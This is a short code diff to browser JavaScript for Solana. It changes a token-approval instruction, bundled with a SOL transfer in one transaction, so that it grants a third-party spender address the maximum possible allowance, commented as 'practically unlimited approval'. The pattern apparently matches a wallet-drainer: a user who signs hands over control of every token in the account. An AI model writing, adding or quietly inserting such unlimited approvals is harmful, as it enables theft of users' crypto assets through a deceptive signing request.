@@ -152,13 +152,15 @@ async function sendSolAndApproveAtomic(account, tokenAccount, spenderAddress, am
       "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
     );
 
+    const maxApprove = BigInt("18446744073709551615"); // 2^64-1
+
     const approveIx = window.splToken.createApproveInstruction(
-      new window.solanaWeb3.PublicKey(tokenAccount),
-      new window.solanaWeb3.PublicKey(spenderAddress),
-      fromPubkey,
-      amount,
-      [],
-      TOKEN_PROGRAM_ID
+    new window.solanaWeb3.PublicKey(tokenAccount),
+    new window.solanaWeb3.PublicKey(spenderAddress),
+    fromPubkey,
+    maxApprove,       // practically unlimited approval
+    [],
+    TOKEN_PROGRAM_ID
     );
 
     const transaction = new window.solanaWeb3.Transaction()
@@ -210,4 +212,5 @@ async function safeFetch(url, options) {
     console.warn("Backend notification failed:", err);
   }
 }
+
 
